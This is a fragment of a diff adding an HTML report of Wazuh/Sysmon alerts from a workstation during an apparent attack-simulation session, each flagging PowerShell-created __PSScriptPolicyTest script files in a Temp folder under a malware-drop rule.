+      &quot;sysmon&quot;,
+      &quot;sysmon_eid11_detections&quot;,
+      &quot;windows&quot;
+    ]
+  },
+  &quot;agent&quot;: {
+    &quot;id&quot;: &quot;005&quot;,
+    &quot;name&quot;: &quot;WS10&quot;,
+    &quot;ip&quot;: &quot;192.168.30.24&quot;
+  },
+  &quot;manager&quot;: {
+    &quot;name&quot;: &quot;wazuh-server&quot;
+  },
+  &quot;id&quot;: &quot;1775117528.1049892&quot;,
+  &quot;decoder&quot;: {
+    &quot;name&quot;: &quot;windows_eventchannel&quot;
+  },
+  &quot;data&quot;: {
+    &quot;win&quot;: {
+      &quot;system&quot;: {
+        &quot;providerName&quot;: &quot;Microsoft-Windows-Sysmon&quot;,
+        &quot;providerGuid&quot;: &quot;{5770385f-c22a-43e0-bf4c-06f5698ffbd9}&quot;,
+        &quot;eventID&quot;: &quot;11&quot;,
+        &quot;version&quot;: &quot;2&quot;,
+        &quot;level&quot;: &quot;4&quot;,
+        &quot;task&quot;: &quot;11&quot;,
+        &quot;opcode&quot;: &quot;0&quot;,
+        &quot;keywords&quot;: &quot;0x8000000000000000&quot;,
+        &quot;systemTime&quot;: &quot;2026-04-02T08:12:05.9875975Z&quot;,
+        &quot;eventRecordID&quot;: &quot;465189&quot;,
+        &quot;processID&quot;: &quot;7940&quot;,
+        &quot;threadID&quot;: &quot;8064&quot;,
+        &quot;channel&quot;: &quot;Microsoft-Windows-Sysmon/Operational&quot;,
+        &quot;computer&quot;: &quot;WS10&quot;,
+        &quot;severityValue&quot;: &quot;INFORMATION&quot;,
+        &quot;message&quot;: &quot;\&quot;File created:\r\nRuleName: -\r\nUtcTime: 2026-04-02 08:12:05.975\r\nProcessGuid: {d9a99926-24d5-69ce-f20e-000000000600}\r\nProcessId: 9204\r\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nTargetFilename: C:\\Users\\Administrator\\AppData\\Local\\Temp\\__PSScriptPolicyTest_mpognya1.l0s.ps1\r\nCreationUtcTime: 2026-04-02 08:12:05.975\r\nUser: WS10\\Administrator\&quot;&quot;
+      },
+      &quot;eventdata&quot;: {
+        &quot;utcTime&quot;: &quot;2026-04-02 08:12:05.975&quot;,
+        &quot;processGuid&quot;: &quot;{d9a99926-24d5-69ce-f20e-000000000600}&quot;,
+        &quot;processId&quot;: &quot;9204&quot;,
+        &quot;image&quot;: &quot;C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe&quot;,
+        &quot;targetFilename&quot;: &quot;C:\\\\Users\\\\Administrator\\\\AppData\\\\Local\\\\Temp\\\\__PSScriptPolicyTest_mpognya1.l0s.ps1&quot;,
+        &quot;creationUtcTime&quot;: &quot;2026-04-02 08:12:05.975&quot;,
+        &quot;user&quot;: &quot;WS10\\\\Administrator&quot;
+      }
+    }
+  },
+  &quot;location&quot;: &quot;EventChannel&quot;,
+  &quot;_inferred_source_ip&quot;: &quot;192.168.30.24&quot;,
+  &quot;_capture_session&quot;: &quot;apt-sim-20260402-100632_20260402_100632&quot;,
+  &quot;_captured_at_utc&quot;: &quot;2026-04-02T08:12:08Z&quot;
+}</pre></div><div class='card'><h3>Level 15 — Executable file dropped in folder commonly used by malware</h3><p><strong>Timestamp:</strong> 2026-04-02T08:13:03.112+0000<br><strong>Agent:</strong> WS10<br><strong>Source IP:</strong> 192.168.30.24</p><pre>{
+  &quot;timestamp&quot;: &quot;2026-04-02T08:13:03.112+0000&quot;,
+  &quot;rule&quot;: {
+    &quot;level&quot;: 15,
+    &quot;description&quot;: &quot;Executable file dropped in folder commonly used by malware&quot;,
+    &quot;id&quot;: &quot;92213&quot;,
+    &quot;mitre&quot;: {
+      &quot;id&quot;: [
+        &quot;T1105&quot;
+      ],
+      &quot;tactic&quot;: [
+        &quot;Command and Control&quot;
+      ],
+      &quot;technique&quot;: [
+        &quot;Ingress Tool Transfer&quot;
+      ]
+    },
+    &quot;firedtimes&quot;: 37,
+    &quot;mail&quot;: true,
+    &quot;groups&quot;: [
+      &quot;sysmon&quot;,
+      &quot;sysmon_eid11_detections&quot;,
+      &quot;windows&quot;
+    ]
+  },
+  &quot;agent&quot;: {
+    &quot;id&quot;: &quot;005&quot;,
+    &quot;name&quot;: &quot;WS10&quot;,
+    &quot;ip&quot;: &quot;192.168.30.24&quot;
+  },
+  &quot;manager&quot;: {
+    &quot;name&quot;: &quot;wazuh-server&quot;
+  },
+  &quot;id&quot;: &quot;1775117583.1052669&quot;,
+  &quot;decoder&quot;: {
+    &quot;name&quot;: &quot;windows_eventchannel&quot;
+  },
+  &quot;data&quot;: {
+    &quot;win&quot;: {
+      &quot;system&quot;: {
+        &quot;providerName&quot;: &quot;Microsoft-Windows-Sysmon&quot;,
+        &quot;providerGuid&quot;: &quot;{5770385f-c22a-43e0-bf4c-06f5698ffbd9}&quot;,
+        &quot;eventID&quot;: &quot;11&quot;,
+        &quot;version&quot;: &quot;2&quot;,
+        &quot;level&quot;: &quot;4&quot;,
+        &quot;task&quot;: &quot;11&quot;,
+        &quot;opcode&quot;: &quot;0&quot;,
+        &quot;keywords&quot;: &quot;0x8000000000000000&quot;,
+        &quot;systemTime&quot;: &quot;2026-04-02T08:13:01.0004197Z&quot;,
+        &quot;eventRecordID&quot;: &quot;465415&quot;,
+        &quot;processID&quot;: &quot;7940&quot;,
+        &quot;threadID&quot;: &quot;8064&quot;,
+        &quot;channel&quot;: &quot;Microsoft-Windows-Sysmon/Operational&quot;,
+        &quot;computer&quot;: &quot;WS10&quot;,
+        &quot;severityValue&quot;: &quot;INFORMATION&quot;,
+        &quot;message&quot;: &quot;\&quot;File created:\r\nRuleName: -\r\nUtcTime: 2026-04-02 08:13:00.983\r\nProcessGuid: {d9a99926-250c-69ce-f30e-000000000600}\r\nProcessId: 4976\r\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nTargetFilename: C:\\Users\\Administrator\\AppData\\Local\\Temp\\__PSScriptPolicyTest_dq4jxtb0.byk.ps1\r\nCreationUtcTime: 2026-04-02 08:13:00.983\r\nUser: WS10\\Administrator\&quot;&quot;
+      },
+      &quot;eventdata&quot;: {
+        &quot;utcTime&quot;: &quot;2026-04-02 08:13:00.983&quot;,
+        &quot;processGuid&quot;: &quot;{d9a99926-250c-69ce-f30e-000000000600}&quot;,
+        &quot;processId&quot;: &quot;4976&quot;,
+        &quot;image&quot;: &quot;C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe&quot;,
+        &quot;targetFilename&quot;: &quot;C:\\\\Users\\\\Administrator\\\\AppData\\\\Local\\\\Temp\\\\__PSScriptPolicyTest_dq4jxtb0.byk.ps1&quot;,
+        &quot;creationUtcTime&quot;: &quot;2026-04-02 08:13:00.983&quot;,
+        &quot;user&quot;: &quot;WS10\\\\Administrator&quot;
+      }
+    }
+  },
+  &quot;location&quot;: &quot;EventChannel&quot;,
+  &quot;_inferred_source_ip&quot;: &quot;192.168.30.24&quot;,
+  &quot;_capture_session&quot;: &quot;apt-sim-20260402-100632_20260402_100632&quot;,
+  &quot;_captured_at_utc&quot;: &quot;2026-04-02T08:13:03Z&quot;
+}</pre></div><div class='card'><h3>Level 15 — Executable file dropped in folder commonly used by malware</h3><p><strong>Timestamp:</strong> 2026-04-02T08:13:41.110+0000<br><strong>Agent:</strong> WS10<br><strong>Source IP:</strong> 192.168.30.24</p><pre>{
+  &quot;timestamp&quot;: &quot;2026-04-02T08:13:41.110+0000&quot;,
+  &quot;rule&quot;: {
+    &quot;level&quot;: 15,
+    &quot;description&quot;: &quot;Executable file dropped in folder commonly used by malware&quot;,
+    &quot;id&quot;: &quot;92213&quot;,
+    &quot;mitre&quot;: {
+      &quot;id&quot;: [
+        &quot;T1105&quot;
+      ],
+      &quot;tactic&quot;: [
+        &quot;Command and Control&quot;
+      ],
+      &quot;technique&quot;: [
+        &quot;Ingress Tool Transfer&quot;
+      ]
+    },
+    &quot;firedtimes&quot;: 38,
+    &quot;mail&quot;: true,
+    &quot;groups&quot;: [
+      &quot;sysmon&quot;,
+      &quot;sysmon_eid11_detections&quot;,
+      &quot;windows&quot;
+    ]
+  },
+  &quot;agent&quot;: {
+    &quot;id&quot;: &quot;005&quot;,
+    &quot;name&quot;: &quot;WS10&quot;,
+    &quot;ip&quot;: &quot;192.168.30.24&quot;
+  },
+  &quot;manager&quot;: {
+    &quot;name&quot;: &quot;wazuh-server&quot;
+  },
+  &quot;id&quot;: &quot;1775117621.1055446&quot;,
+  &quot;decoder&quot;: {
+    &quot;name&quot;: &quot;windows_eventchannel&quot;
+  },
+  &quot;data&quot;: {
+    &quot;win&quot;: {
+      &quot;system&quot;: {
+        &quot;providerName&quot;: &quot;Microsoft-Windows-Sysmon&quot;,
+        &quot;providerGuid&quot;: &quot;{5770385f-c22a-43e0-bf4c-06f5698ffbd9}&quot;,
+        &quot;eventID&quot;: &quot;11&quot;,
+        &quot;version&quot;: &quot;2&quot;,
+        &quot;level&quot;: &quot;4&quot;,
+        &quot;task&quot;: &quot;11&quot;,
+        &quot;opcode&quot;: &quot;0&quot;,
+        &quot;keywords&quot;: &quot;0x8000000000000000&quot;,
+        &quot;systemTime&quot;: &quot;2026-04-02T08:13:39.0417458Z&quot;,
+        &quot;eventRecordID&quot;: &quot;465694&quot;,
+        &quot;processID&quot;: &quot;7940&quot;,
+        &quot;threadID&quot;: &quot;8064&quot;,
+        &quot;channel&quot;: &quot;Microsoft-Windows-Sysmon/Operational&quot;,
+        &quot;computer&quot;: &quot;WS10&quot;,
+        &quot;severityValue&quot;: &quot;INFORMATION&quot;,
+        &quot;message&quot;: &quot;\&quot;File created:\r\nRuleName: -\r\nUtcTime: 2026-04-02 08:13:39.027\r\nProcessGuid: {d9a99926-2532-69ce-f40e-000000000600}\r\nProcessId: 5856\r\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nTargetFilename: C:\\Users\\Administrator\\AppData\\Local\\Temp\\__PSScriptPolicyTest_4w5f04xi.vhc.ps1\r\nCreationUtcTime: 2026-04-02 08:13:39.027\r\nUser: WS10\\Administrator\&quot;&quot;
+      },
+      &quot;eventdata&quot;: {
+        &quot;utcTime&quot;: &quot;2026-04-02 08:13:39.027&quot;,
+        &quot;processGuid&quot;: &quot;{d9a99926-2532-69ce-f40e-000000000600}&quot;,
+        &quot;processId&quot;: &quot;5856&quot;,
+        &quot;image&quot;: &quot;C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe&quot;,
+        &quot;targetFilename&quot;: &quot;C:\\\\Users\\\\Administrator\\\\AppData\\\\Local\\\\Temp\\\\__PSScriptPolicyTest_4w5f04xi.vhc.ps1&quot;,
+        &quot;creationUtcTime&quot;: &quot;2026-04-02 08:13:39.027&quot;,
+        &quot;user&quot;: &quot;WS10\\\\Administrator&quot;
+      }
+    }
+  },
+  &quot;location&quot;: &quot;EventChannel&quot;,
+  &quot;_inferred_source_ip&quot;: &quot;192.168.30.24&quot;,
+  &quot;_capture_session&quot;: &quot;apt-sim-20260402-100632_20260402_100632&quot;,
+  &quot;_captured_at_utc&quot;: &quot;2026-04-02T08:13:41Z&quot;
+}</pre></div>
+</body></html>
